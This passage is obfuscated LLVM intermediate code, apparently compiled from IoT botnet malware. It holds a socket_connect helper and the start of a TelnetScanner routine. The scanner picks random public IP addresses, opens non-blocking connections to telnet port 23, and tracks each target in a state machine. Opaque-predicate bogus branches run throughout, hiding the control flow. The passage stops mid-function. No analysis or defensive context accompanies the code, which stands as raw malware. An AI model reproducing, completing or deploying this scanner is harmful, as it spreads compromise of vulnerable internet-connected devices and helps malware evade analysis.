  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  %5 = icmp sgt i32 3, %4
  br i1 %5, label %6, label %23

; <label>:6:                                      ; preds = %1
  %7 = load i32, i32* @x.79
  %8 = load i32, i32* @y.80
  %9 = sub i32 %7, 1
  %10 = mul i32 %7, %9
  %11 = urem i32 %10, 2
  %12 = icmp eq i32 %11, 0
  %13 = icmp slt i32 %8, 10
  %14 = or i1 %12, %13
  br i1 %14, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %6
  store i32 1, i32* %2, align 4
  %15 = load i32, i32* @x.79
  %16 = load i32, i32* @y.80
  %17 = sub i32 %15, 1
  %18 = mul i32 %15, %17
  %19 = urem i32 %18, 2
  %20 = icmp eq i32 %19, 0
  %21 = icmp slt i32 %16, 10
  %22 = or i1 %20, %21
  br i1 %22, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %26

; <label>:23:                                     ; preds = %1
  %24 = load i32, i32* %3, align 4
  %25 = call i32 @close(i32 %24)
  store i32 0, i32* %2, align 4
  br label %26

; <label>:26:                                     ; preds = %23, %originalBBpart2
  %27 = load i32, i32* %2, align 4
  ret i32 %27

originalBBalteredBB:                              ; preds = %originalBB, %6
  store i32 1, i32* %2, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i16, align 2
  %6 = alloca %struct.hostent*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i16 %1, i16* %5, align 2
  store i32 1, i32* %8, align 4
  %10 = load i8*, i8** %4, align 8
  %11 = call %struct.hostent* @gethostbyname(i8* %10)
  store %struct.hostent* %11, %struct.hostent** %6, align 8
  %12 = icmp eq %struct.hostent* %11, null
  br i1 %12, label %13, label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %61

; <label>:14:                                     ; preds = %2
  %15 = load %struct.hostent*, %struct.hostent** %6, align 8
  %16 = getelementptr inbounds %struct.hostent, %struct.hostent* %15, i32 0, i32 4
  %17 = load i8**, i8*** %16, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 0
  %19 = load i8*, i8** %18, align 8
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %21 = bitcast %struct.in_addr* %20 to i8*
  %22 = load %struct.hostent*, %struct.hostent** %6, align 8
  %23 = getelementptr inbounds %struct.hostent, %struct.hostent* %22, i32 0, i32 3
  %24 = load i32, i32* %23, align 4
  %25 = sext i32 %24 to i64
  call void @bcopy(i8* %19, i8* %21, i64 %25) #2
  %26 = load i16, i16* %5, align 2
  %27 = call zeroext i16 @htons(i16 zeroext %26) #13
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %27, i16* %28, align 2
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %29, align 4
  %30 = call i32 @socket(i32 2, i32 1, i32 6) #2
  store i32 %30, i32* %9, align 4
  %31 = load i32, i32* %9, align 4
  %32 = bitcast i32* %8 to i8*
  %33 = call i32 @setsockopt(i32 %31, i32 6, i32 1, i8* %32, i32 4) #2
  %34 = load i32, i32* %9, align 4
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %14
  store i32 0, i32* %3, align 4
  br label %61

; <label>:37:                                     ; preds = %14
  %38 = load i32, i32* @x.81
  %39 = load i32, i32* @y.82
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %37
  %46 = load i32, i32* %9, align 4
  %47 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %48 = call i32 @connect(i32 %46, %struct.sockaddr* %47, i32 16)
  %49 = icmp eq i32 %48, -1
  %50 = load i32, i32* @x.81
  %51 = load i32, i32* @y.82
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %49, label %58, label %59

; <label>:58:                                     ; preds = %originalBBpart2
  store i32 0, i32* %3, align 4
  br label %61

; <label>:59:                                     ; preds = %originalBBpart2
  %60 = load i32, i32* %9, align 4
  store i32 %60, i32* %3, align 4
  br label %61

; <label>:61:                                     ; preds = %59, %58, %36, %13
  %62 = load i32, i32* @x.81
  %63 = load i32, i32* @y.82
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %61
  %70 = load i32, i32* %3, align 4
  %71 = load i32, i32* @x.81
  %72 = load i32, i32* @y.82
  %73 = sub i32 %71, 1
  %74 = mul i32 %71, %73
  %75 = urem i32 %74, 2
  %76 = icmp eq i32 %75, 0
  %77 = icmp slt i32 %72, 10
  %78 = or i1 %76, %77
  br i1 %78, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  ret i32 %70

originalBBalteredBB:                              ; preds = %originalBB, %37
  %79 = load i32, i32* %9, align 4
  %80 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %81 = call i32 @connect(i32 %79, %struct.sockaddr* %80, i32 16)
  %82 = icmp eq i32 %81, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %61
  %83 = load i32, i32* %3, align 4
  br label %originalBB1
}

declare %struct.hostent* @gethostbyname(i8*) #3

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #4

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #4

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #4

; Function Attrs: noinline nounwind uwtable
define void @TelnetScanner(i32, i32) #0 {
  %3 = load i32, i32* @x.83
  %4 = load i32, i32* @y.84
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [128 x i8], align 16
  %18 = alloca i8, align 1
  %19 = alloca i32, align 4
  %20 = alloca %struct.__sigset_t, align 8
  %21 = alloca %struct.timeval, align 8
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca [256 x i8], align 16
  %25 = alloca i8*, align 8
  %26 = alloca %struct.sockaddr_in, align 4
  %27 = alloca i8*, align 8
  %28 = alloca i8*, align 8
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  store i32 %0, i32* %11, align 4
  store i32 %1, i32* %12, align 4
  %31 = load i32, i32* %12, align 4
  store i32 %31, i32* %19, align 4
  %32 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %33 = call i32 @rand_cmwc()
  %34 = xor i32 %32, %33
  call void @srand(i32 %34) #2
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %26, i32 0, i32 0
  store i16 2, i16* %35, align 4
  %36 = call zeroext i16 @htons(i16 zeroext 23) #13
  %37 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %26, i32 0, i32 1
  store i16 %36, i16* %37, align 2
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %26, i32 0, i32 3
  %39 = getelementptr inbounds [8 x i8], [8 x i8]* %38, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %39, i8 0, i64 8, i32 4, i1 false)
  %40 = call noalias i8* @malloc(i64 1025) #2
  store i8* %40, i8** %25, align 8
  %41 = load i8*, i8** %25, align 8
  call void @llvm.memset.p0i8.i64(i8* %41, i8 0, i64 1025, i32 1, i1 false)
  %42 = load i32, i32* %19, align 4
  %43 = zext i32 %42 to i64
  %44 = call i8* @llvm.stacksave()
  store i8* %44, i8** %27, align 8
  %45 = alloca %struct.telstate_t, i64 %43, align 16
  %46 = bitcast %struct.telstate_t* %45 to i8*
  %47 = load i32, i32* %19, align 4
  %48 = sext i32 %47 to i64
  %49 = mul i64 %48, 5
  call void @llvm.memset.p0i8.i64(i8* %46, i8 0, i64 %49, i32 16, i1 false)
  store i32 0, i32* %13, align 4
  %50 = load i32, i32* @x.83
  %51 = load i32, i32* @y.84
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %58

; <label>:58:                                     ; preds = %originalBBpart218, %originalBBpart2
  %59 = load i32, i32* %13, align 4
  %60 = load i32, i32* %19, align 4
  %61 = icmp slt i32 %59, %60
  br i1 %61, label %62, label %95

; <label>:62:                                     ; preds = %58
  %63 = load i32, i32* %13, align 4
  %64 = sext i32 %63 to i64
  %65 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %64
  %66 = bitcast %struct.telstate_t* %65 to i8*
  call void @llvm.memset.p0i8.i64(i8* %66, i8 0, i64 32, i32 16, i1 false)
  %67 = load i32, i32* %13, align 4
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %68
  %70 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %69, i32 0, i32 3
  store i8 1, i8* %70, align 1
  %71 = load i8*, i8** %25, align 8
  %72 = load i32, i32* %13, align 4
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %73
  %75 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i32 0, i32 9
  store i8* %71, i8** %75, align 8
  br label %76

; <label>:76:                                     ; preds = %62
  %77 = load i32, i32* @x.83
  %78 = load i32, i32* @y.84
  %79 = sub i32 %77, 1
  %80 = mul i32 %77, %79
  %81 = urem i32 %80, 2
  %82 = icmp eq i32 %81, 0
  %83 = icmp slt i32 %78, 10
  %84 = or i1 %82, %83
  br i1 %84, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %76
  %85 = load i32, i32* %13, align 4
  %86 = add nsw i32 %85, 1
  store i32 %86, i32* %13, align 4
  %87 = load i32, i32* @x.83
  %88 = load i32, i32* @y.84
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBBpart218, label %originalBB14alteredBB

originalBBpart218:                                ; preds = %originalBB14
  br label %58

; <label>:95:                                     ; preds = %58
  %96 = load i32, i32* @x.83
  %97 = load i32, i32* @y.84
  %98 = sub i32 %96, 1
  %99 = mul i32 %96, %98
  %100 = urem i32 %99, 2
  %101 = icmp eq i32 %100, 0
  %102 = icmp slt i32 %97, 10
  %103 = or i1 %101, %102
  br i1 %103, label %originalBB20, label %originalBB20alteredBB

originalBB20:                                     ; preds = %originalBB20alteredBB, %95
  store i32 0, i32* %15, align 4
  %104 = load i32, i32* @x.83
  %105 = load i32, i32* @y.84
  %106 = sub i32 %104, 1
  %107 = mul i32 %104, %106
  %108 = urem i32 %107, 2
  %109 = icmp eq i32 %108, 0
  %110 = icmp slt i32 %105, 10
  %111 = or i1 %109, %110
  br i1 %111, label %originalBBpart222, label %originalBB20alteredBB

originalBBpart222:                                ; preds = %originalBB20
  br label %112

; <label>:112:                                    ; preds = %originalBBpart226, %originalBBpart222
  %113 = load i32, i32* %15, align 4
  %114 = add nsw i32 %113, 1
  store i32 %114, i32* %15, align 4
  %115 = sext i32 %114 to i64
  %116 = getelementptr inbounds [11 x i8*], [11 x i8*]* @tmpdirs, i64 0, i64 %115
  %117 = load i8*, i8** %116, align 8
  %118 = icmp ne i8* %117, null
  br i1 %118, label %119, label %136

; <label>:119:                                    ; preds = %112
  %120 = load i32, i32* @x.83
  %121 = load i32, i32* @y.84
  %122 = sub i32 %120, 1
  %123 = mul i32 %120, %122
  %124 = urem i32 %123, 2
  %125 = icmp eq i32 %124, 0
  %126 = icmp slt i32 %121, 10
  %127 = or i1 %125, %126
  br i1 %127, label %originalBB24, label %originalBB24alteredBB

originalBB24:                                     ; preds = %originalBB24alteredBB, %119
  %128 = load i32, i32* @x.83
  %129 = load i32, i32* @y.84
  %130 = sub i32 %128, 1
  %131 = mul i32 %128, %130
  %132 = urem i32 %131, 2
  %133 = icmp eq i32 %132, 0
  %134 = icmp slt i32 %129, 10
  %135 = or i1 %133, %134
  br i1 %135, label %originalBBpart226, label %originalBB24alteredBB

originalBBpart226:                                ; preds = %originalBB24
  br label %112

; <label>:136:                                    ; preds = %112
  br label %137

; <label>:137:                                    ; preds = %1318, %136
  br label %138

; <label>:138:                                    ; preds = %137
  %139 = load i32, i32* @x.83
  %140 = load i32, i32* @y.84
  %141 = sub i32 %139, 1
  %142 = mul i32 %139, %141
  %143 = urem i32 %142, 2
  %144 = icmp eq i32 %143, 0
  %145 = icmp slt i32 %140, 10
  %146 = or i1 %144, %145
  br i1 %146, label %originalBB28, label %originalBB28alteredBB

originalBB28:                                     ; preds = %originalBB28alteredBB, %138
  store i32 0, i32* %13, align 4
  %147 = load i32, i32* @x.83
  %148 = load i32, i32* @y.84
  %149 = sub i32 %147, 1
  %150 = mul i32 %147, %149
  %151 = urem i32 %150, 2
  %152 = icmp eq i32 %151, 0
  %153 = icmp slt i32 %148, 10
  %154 = or i1 %152, %153
  br i1 %154, label %originalBBpart230, label %originalBB28alteredBB

originalBBpart230:                                ; preds = %originalBB28
  br label %155

; <label>:155:                                    ; preds = %1315, %originalBBpart230
  %156 = load i32, i32* @x.83
  %157 = load i32, i32* @y.84
  %158 = sub i32 %156, 1
  %159 = mul i32 %156, %158
  %160 = urem i32 %159, 2
  %161 = icmp eq i32 %160, 0
  %162 = icmp slt i32 %157, 10
  %163 = or i1 %161, %162
  br i1 %163, label %originalBB32, label %originalBB32alteredBB

originalBB32:                                     ; preds = %originalBB32alteredBB, %155
  %164 = load i32, i32* %13, align 4
  %165 = load i32, i32* %19, align 4
  %166 = icmp slt i32 %164, %165
  %167 = load i32, i32* @x.83
  %168 = load i32, i32* @y.84
  %169 = sub i32 %167, 1
  %170 = mul i32 %167, %169
  %171 = urem i32 %170, 2
  %172 = icmp eq i32 %171, 0
  %173 = icmp slt i32 %168, 10
  %174 = or i1 %172, %173
  br i1 %174, label %originalBBpart234, label %originalBB32alteredBB

originalBBpart234:                                ; preds = %originalBB32
  br i1 %166, label %175, label %1318

; <label>:175:                                    ; preds = %originalBBpart234
  %176 = load i32, i32* %13, align 4
  %177 = sext i32 %176 to i64
  %178 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %177
  %179 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %178, i32 0, i32 7
  %180 = load i32, i32* %179, align 16
  %181 = icmp eq i32 %180, 0
  br i1 %181, label %182, label %188

; <label>:182:                                    ; preds = %175
  %183 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %184 = load i32, i32* %13, align 4
  %185 = sext i32 %184 to i64
  %186 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %185
  %187 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %186, i32 0, i32 7
  store i32 %183, i32* %187, align 16
  br label %188

; <label>:188:                                    ; preds = %182, %175
  %189 = load i32, i32* %13, align 4
  %190 = sext i32 %189 to i64
  %191 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %190
  %192 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %191, i32 0, i32 2
  %193 = load i8, i8* %192, align 8
  %194 = zext i8 %193 to i32
  switch i32 %194, label %1298 [
    i32 0, label %195
    i32 1, label %443
    i32 2, label %621
    i32 3, label %698
    i32 4, label %775
    i32 5, label %868
    i32 6, label %929
    i32 7, label %1123
  ]

; <label>:195:                                    ; preds = %188
  %196 = load i32, i32* %13, align 4
  %197 = sext i32 %196 to i64
  %198 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %197
  %199 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %198, i32 0, i32 3
  %200 = load i8, i8* %199, align 1
  %201 = zext i8 %200 to i32
  %202 = icmp eq i32 %201, 1
  br i1 %202, label %203, label %239

; <label>:203:                                    ; preds = %195
  %204 = load i32, i32* @x.83
  %205 = load i32, i32* @y.84
  %206 = sub i32 %204, 1
  %207 = mul i32 %204, %206
  %208 = urem i32 %207, 2
  %209 = icmp eq i32 %208, 0
  %210 = icmp slt i32 %205, 10
  %211 = or i1 %209, %210
  br i1 %211, label %originalBB36, label %originalBB36alteredBB

originalBB36:                                     ; preds = %originalBB36alteredBB, %203
  %212 = load i32, i32* %13, align 4
  %213 = sext i32 %212 to i64
  %214 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %213
  %215 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %214, i32 0, i32 9
  %216 = load i8*, i8** %215, align 8
  store i8* %216, i8** %28, align 8
  %217 = load i32, i32* %13, align 4
  %218 = sext i32 %217 to i64
  %219 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %218
  %220 = bitcast %struct.telstate_t* %219 to i8*
  call void @llvm.memset.p0i8.i64(i8* %220, i8 0, i64 32, i32 16, i1 false)
  %221 = load i8*, i8** %28, align 8
  %222 = load i32, i32* %13, align 4
  %223 = sext i32 %222 to i64
  %224 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %223
  %225 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %224, i32 0, i32 9
  store i8* %221, i8** %225, align 8
  %226 = call i32 @GetRandomPublicIP()
  %227 = load i32, i32* %13, align 4
  %228 = sext i32 %227 to i64
  %229 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %228
  %230 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %229, i32 0, i32 1
  store i32 %226, i32* %230, align 4
  %231 = load i32, i32* @x.83
  %232 = load i32, i32* @y.84
  %233 = sub i32 %231, 1
  %234 = mul i32 %231, %233
  %235 = urem i32 %234, 2
  %236 = icmp eq i32 %235, 0
  %237 = icmp slt i32 %232, 10
  %238 = or i1 %236, %237
  br i1 %238, label %originalBBpart238, label %originalBB36alteredBB

originalBBpart238:                                ; preds = %originalBB36
  br label %335

; <label>:239:                                    ; preds = %195
  %240 = load i32, i32* %13, align 4
  %241 = sext i32 %240 to i64
  %242 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %241
  %243 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %242, i32 0, i32 3
  %244 = load i8, i8* %243, align 1
  %245 = zext i8 %244 to i32
  %246 = icmp eq i32 %245, 0
  br i1 %246, label %247, label %318

; <label>:247:                                    ; preds = %239
  %248 = load i32, i32* @x.83
  %249 = load i32, i32* @y.84
  %250 = sub i32 %248, 1
  %251 = mul i32 %248, %250
  %252 = urem i32 %251, 2
  %253 = icmp eq i32 %252, 0
  %254 = icmp slt i32 %249, 10
  %255 = or i1 %253, %254
  br i1 %255, label %originalBB40, label %originalBB40alteredBB

originalBB40:                                     ; preds = %originalBB40alteredBB, %247
  %256 = load i32, i32* %13, align 4
  %257 = sext i32 %256 to i64
  %258 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %257
  %259 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %258, i32 0, i32 5
  %260 = load i8, i8* %259, align 1
  %261 = add i8 %260, 1
  store i8 %261, i8* %259, align 1
  %262 = load i32, i32* %13, align 4
  %263 = sext i32 %262 to i64
  %264 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %263
  %265 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %264, i32 0, i32 4
  %266 = load i8, i8* %265, align 2
  %267 = add i8 %266, 1
  store i8 %267, i8* %265, align 2
  %268 = load i32, i32* %13, align 4
  %269 = sext i32 %268 to i64
  %270 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %269
  %271 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %270, i32 0, i32 5
  %272 = load i8, i8* %271, align 1
  %273 = zext i8 %272 to i64
  %274 = icmp eq i64 %273, 20
  %275 = load i32, i32* @x.83
  %276 = load i32, i32* @y.84
  %277 = sub i32 %275, 1
  %278 = mul i32 %275, %277
  %279 = urem i32 %278, 2
  %280 = icmp eq i32 %279, 0
  %281 = icmp slt i32 %276, 10
  %282 = or i1 %280, %281
  br i1 %282, label %originalBBpart258, label %originalBB40alteredBB

originalBBpart258:                                ; preds = %originalBB40
  br i1 %274, label %283, label %288

; <label>:283:                                    ; preds = %originalBBpart258
  %284 = load i32, i32* %13, align 4
  %285 = sext i32 %284 to i64
  %286 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %285
  %287 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %286, i32 0, i32 3
  store i8 1, i8* %287, align 1
  br label %1315

; <label>:288:                                    ; preds = %originalBBpart258
  %289 = load i32, i32* @x.83
  %290 = load i32, i32* @y.84
  %291 = sub i32 %289, 1
  %292 = mul i32 %289, %291
  %293 = urem i32 %292, 2
  %294 = icmp eq i32 %293, 0
  %295 = icmp slt i32 %290, 10
  %296 = or i1 %294, %295
  br i1 %296, label %originalBB60, label %originalBB60alteredBB

originalBB60:                                     ; preds = %originalBB60alteredBB, %288
  %297 = load i32, i32* %13, align 4
  %298 = sext i32 %297 to i64
  %299 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %298
  %300 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %299, i32 0, i32 4
  %301 = load i8, i8* %300, align 2
  %302 = zext i8 %301 to i64
  %303 = icmp eq i64 %302, 20
  %304 = load i32, i32* @x.83
  %305 = load i32, i32* @y.84
  %306 = sub i32 %304, 1
  %307 = mul i32 %304, %306
  %308 = urem i32 %307, 2
  %309 = icmp eq i32 %308, 0
  %310 = icmp slt i32 %305, 10
  %311 = or i1 %309, %310
  br i1 %311, label %originalBBpart262, label %originalBB60alteredBB

originalBBpart262:                                ; preds = %originalBB60
  br i1 %303, label %312, label %317

; <label>:312:                                    ; preds = %originalBBpart262
  %313 = load i32, i32* %13, align 4
  %314 = sext i32 %313 to i64
  %315 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %314
  %316 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %315, i32 0, i32 3
  store i8 1, i8* %316, align 1
  br label %1315

; <label>:317:                                    ; preds = %originalBBpart262
  br label %318

; <label>:318:                                    ; preds = %317, %239
  %319 = load i32, i32* @x.83
  %320 = load i32, i32* @y.84
  %321 = sub i32 %319, 1
  %322 = mul i32 %319, %321
  %323 = urem i32 %322, 2
  %324 = icmp eq i32 %323, 0
  %325 = icmp slt i32 %320, 10
  %326 = or i1 %324, %325
  br i1 %326, label %originalBB64, label %originalBB64alteredBB

originalBB64:                                     ; preds = %originalBB64alteredBB, %318
  %327 = load i32, i32* @x.83
  %328 = load i32, i32* @y.84
  %329 = sub i32 %327, 1
  %330 = mul i32 %327, %329
  %331 = urem i32 %330, 2
  %332 = icmp eq i32 %331, 0
  %333 = icmp slt i32 %328, 10
  %334 = or i1 %332, %333
  br i1 %334, label %originalBBpart266, label %originalBB64alteredBB

originalBBpart266:                                ; preds = %originalBB64
  br label %335

; <label>:335:                                    ; preds = %originalBBpart266, %originalBBpart238
  %336 = load i32, i32* @x.83
  %337 = load i32, i32* @y.84
  %338 = sub i32 %336, 1
  %339 = mul i32 %336, %338
  %340 = urem i32 %339, 2
  %341 = icmp eq i32 %340, 0
  %342 = icmp slt i32 %337, 10
  %343 = or i1 %341, %342
  br i1 %343, label %originalBB68, label %originalBB68alteredBB

originalBB68:                                     ; preds = %originalBB68alteredBB, %335
  %344 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %26, i32 0, i32 0
  store i16 2, i16* %344, align 4
  %345 = call zeroext i16 @htons(i16 zeroext 23) #13
  %346 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %26, i32 0, i32 1
  store i16 %345, i16* %346, align 2
  %347 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %26, i32 0, i32 3
  %348 = getelementptr inbounds [8 x i8], [8 x i8]* %347, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %348, i8 0, i64 8, i32 4, i1 false)
  %349 = load i32, i32* %13, align 4
  %350 = sext i32 %349 to i64
  %351 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %350
  %352 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %351, i32 0, i32 1
  %353 = load i32, i32* %352, align 4
  %354 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %26, i32 0, i32 2
  %355 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %354, i32 0, i32 0
  store i32 %353, i32* %355, align 4
  %356 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %357 = load i32, i32* %13, align 4
  %358 = sext i32 %357 to i64
  %359 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %358
  %360 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %359, i32 0, i32 0
  store i32 %356, i32* %360, align 16
  %361 = load i32, i32* %13, align 4
  %362 = sext i32 %361 to i64
  %363 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %362
  %364 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %363, i32 0, i32 0
  %365 = load i32, i32* %364, align 16
  %366 = icmp eq i32 %365, -1
  %367 = load i32, i32* @x.83
  %368 = load i32, i32* @y.84
  %369 = sub i32 %367, 1
  %370 = mul i32 %367, %369
  %371 = urem i32 %370, 2
  %372 = icmp eq i32 %371, 0
  %373 = icmp slt i32 %368, 10
  %374 = or i1 %372, %373
  br i1 %374, label %originalBBpart270, label %originalBB68alteredBB

originalBBpart270:                                ; preds = %originalBB68
  br i1 %366, label %375, label %376

; <label>:375:                                    ; preds = %originalBBpart270
  br label %1315

; <label>:376:                                    ; preds = %originalBBpart270
  %377 = load i32, i32* %13, align 4
  %378 = sext i32 %377 to i64
  %379 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %378
  %380 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %379, i32 0, i32 0
  %381 = load i32, i32* %380, align 16
  %382 = load i32, i32* %13, align 4
  %383 = sext i32 %382 to i64
  %384 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %383
  %385 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %384, i32 0, i32 0
  %386 = load i32, i32* %385, align 16
  %387 = call i32 (i32, i32, ...) @fcntl(i32 %386, i32 3, i8* null)
  %388 = or i32 %387, 2048
  %389 = call i32 (i32, i32, ...) @fcntl(i32 %381, i32 4, i32 %388)
  %390 = load i32, i32* %13, align 4
  %391 = sext i32 %390 to i64
  %392 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %391
  %393 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %392, i32 0, i32 0
  %394 = load i32, i32* %393, align 16
  %395 = bitcast %struct.sockaddr_in* %26 to %struct.sockaddr*
  %396 = call i32 @connect(i32 %394, %struct.sockaddr* %395, i32 16)
  %397 = icmp eq i32 %396, -1
  br i1 %397, label %398, label %438

; <label>:398:                                    ; preds = %376
  %399 = load i32, i32* @x.83
  %400 = load i32, i32* @y.84
  %401 = sub i32 %399, 1
  %402 = mul i32 %399, %401
  %403 = urem i32 %402, 2
  %404 = icmp eq i32 %403, 0
  %405 = icmp slt i32 %400, 10
  %406 = or i1 %404, %405
  br i1 %406, label %originalBB72, label %originalBB72alteredBB

originalBB72:                                     ; preds = %originalBB72alteredBB, %398
  %407 = call i32* @__errno_location() #13
  %408 = load i32, i32* %407, align 4
  %409 = icmp ne i32 %408, 115
  %410 = load i32, i32* @x.83
  %411 = load i32, i32* @y.84
  %412 = sub i32 %410, 1
  %413 = mul i32 %410, %412
  %414 = urem i32 %413, 2
  %415 = icmp eq i32 %414, 0
  %416 = icmp slt i32 %411, 10
  %417 = or i1 %415, %416
  br i1 %417, label %originalBBpart274, label %originalBB72alteredBB

originalBBpart274:                                ; preds = %originalBB72
  br i1 %409, label %418, label %438

; <label>:418:                                    ; preds = %originalBBpart274
  %419 = load i32, i32* @x.83
